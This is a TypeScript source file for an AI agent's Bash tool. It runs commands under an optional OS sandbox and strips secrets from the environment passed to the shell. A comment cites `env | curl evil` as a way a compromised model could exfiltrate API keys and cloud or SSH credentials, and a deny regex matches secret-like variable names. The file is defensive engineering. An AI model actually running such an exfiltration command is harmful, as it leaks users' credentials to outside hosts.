/**
 * Built-in Bash shell command execution tool.
 *
 * Spawns commands under an optional OS-level sandbox (Seatbelt on macOS,
 * bubblewrap on Linux). The sandbox is selected by the Engine and handed
 * down via ToolContext.sandbox. Without a sandbox we fall back to the
 * historical behavior — plain shell spawn in the user's environment.
 */

import { spawn } from "node:child_process";
import { StringDecoder } from "node:string_decoder";
import type { ToolContext } from "../context.js";
import { createOffBackend } from "../sandbox/off.js";
import type { ToolDefinition } from "../../types.js";

export const bashToolDef: ToolDefinition = {
  name: "Bash",
  description:
    "Execute a shell command and return its output. " +
    "Commands run in the user's default shell. Use for system operations, " +
    "git commands, running tests, installing packages, etc.",
  inputSchema: {
    type: "object",
    properties: {
      command: { type: "string", description: "The shell command to execute" },
      timeout: {
        type: "number",
        description: "Timeout in milliseconds (default: 120000). Outer registry caps at 1h.",
      },
      description: {
        type: "string",
        description: "Short description of what the command does",
      },
    },
    required: ["command"],
  },
};

const MAX_OUTPUT = 100_000;
const MAX_BUFFER = 10 * 1024 * 1024;

/**
 * Env vars that are always safe to forward into the sandboxed shell. We pass
 * through enough for common Unix tooling (locale, PATH, HOME, terminal width)
 * but strip everything else. The Bash tool is the only thing the LLM can
 * directly steer at the shell, and a tainted model with full env access can
 * trivially exfiltrate `OPENROUTER_API_KEY` / `AWS_*` / `SSH_AUTH_SOCK` via
 * `env | curl evil`. Filesystem-level deniedReads don't help once secrets are
 * already in the process environment.
 *
 * `off` backend keeps the historical full-passthrough behavior — the user
 * explicitly opted out of sandboxing.
 */
const ENV_ALLOWLIST = new Set([
  "PATH",
  "HOME",
  "USER",
  "LOGNAME",
  "SHELL",
  "LANG",
  "LC_ALL",
  "LC_CTYPE",
  "TERM",
  "TMPDIR",
  "TZ",
  "COLUMNS",
  "LINES",
  "PWD",
]);

/**
 * Names matching these patterns are dropped even if they appear in the
 * allowlist (defense in depth — e.g. a user setting `PATH_TOKEN` shouldn't
 * leak just because it starts with `PATH`). Match is case-insensitive on
 * the full name.
 */
const ENV_DENY_REGEX = /(KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|SESSION|AUTH|COOKIE|PRIVATE)/i;

function buildSandboxEnv(): NodeJS.ProcessEnv {
  const out: NodeJS.ProcessEnv = {};
  for (const name of ENV_ALLOWLIST) {
    const v = process.env[name];
    if (v !== undefined && !ENV_DENY_REGEX.test(name)) {
      out[name] = v;
    }
  }
  return out;
}

export async function bashTool(
  args: Record<string, unknown>,
  ctx?: ToolContext,
): Promise<string> {
  const command = args.command as string;
  if (!command) return "Error: command is required";

  const timeout = (args.timeout as number) || 120_000;
  const cwd = ctx?.cwd ?? process.cwd();
  const shell = process.env.SHELL || "/bin/bash";
  const backend = ctx?.sandbox ?? createOffBackend();
  const wrapped = backend.wrap(command, { cwd, shell });
  const { file, args: spawnArgs, cleanup } = wrapped;
  const env = backend.name === "off" ? { ...process.env } : buildSandboxEnv();

  return new Promise<string>((resolve) => {
    let settled = false;
    const finish = (output: string) => {
      if (settled) return;
      settled = true;
      // Backend-allocated per-command resources (seatbelt's tmp profile
      // dir, etc.) are released here. cleanup is best-effort and must
      // never throw — see the seatbelt backend for rationale.
      try {
        cleanup?.();
      } catch {
        // ignore
      }
      resolve(output);
    };

    const child = spawn(file, spawnArgs, { cwd, env });

    // StringDecoder buffers partial utf-8 sequences across chunks, so a
    // multi-byte CJK character split across two `data` events still decodes
    // cleanly. Slicing the decoded string by .length is fine for truncation —
    // we only cap at MAX_BUFFER chars (not bytes), which is the same budget
    // the downstream MAX_OUTPUT clamp uses.
    const stdoutDec = new StringDecoder("utf-8");
    const stderrDec = new StringDecoder("utf-8");
    let stdout = "";
    let stderr = "";
    let stdoutOver = false;
    let stderrOver = false;
    let timedOut = false;

    const timer = setTimeout(() => {
      timedOut = true;
      child.kill("SIGTERM");
      setTimeout(() => child.kill("SIGKILL"), 2000).unref();
    }, timeout);

    child.stdout?.on("data", (chunk: Buffer) => {
      if (stdoutOver) return;
      const piece = stdoutDec.write(chunk);
      if (stdout.length + piece.length > MAX_BUFFER) {
        stdoutOver = true;
        stdout += piece.slice(0, MAX_BUFFER - stdout.length);
      } else {
        stdout += piece;
      }
    });
    child.stderr?.on("data", (chunk: Buffer) => {
      if (stderrOver) return;
      const piece = stderrDec.write(chunk);
      if (stderr.length + piece.length > MAX_BUFFER) {
        stderrOver = true;
        stderr += piece.slice(0, MAX_BUFFER - stderr.length);
      } else {
        stderr += piece;
      }
    });

    child.on("error", (err) => {
      clearTimeout(timer);
      finish(`Failed to spawn command: ${(err as Error).message}`);
    });

    child.on("close", (code, signal) => {
      clearTimeout(timer);
      // Flush any trailing incomplete utf-8 (returns empty string when the
      // last write completed a sequence).
      const tailOut = stdoutDec.end();
      const tailErr = stderrDec.end();
      if (tailOut && !stdoutOver) stdout += tailOut;
      if (tailErr && !stderrOver) stderr += tailErr;

      if (timedOut) {
        finish(`Command timed out after ${timeout}ms`);
        return;
      }

      let output = "";
      if (stdout) output += stdout;
      if (stderr) output += (output ? "\n" : "") + `STDERR:\n${stderr}`;
      if (!output) output = "(command completed with no output)";

      if (code !== 0 && code !== null) {
        output = `Exit code: ${code}\n${output}`;
      } else if (code === null && signal) {
        // Killed by a signal we didn't time out on — OOM-kill, sandbox-kill,
        // external SIGKILL. Surface so the model can distinguish from our
        // own timeout path above.
        output = `Killed by signal: ${signal}\n${output}`;
      }

      const hint = backend.hintForBlockedOutput?.(stderr);
      if (hint) output += hint;

      if (output.length > MAX_OUTPUT) {
        output =
          output.slice(0, MAX_OUTPUT) +
          `\n\n... output truncated (${output.length} chars total)`;
      }

      finish(output);
    });
  });
}
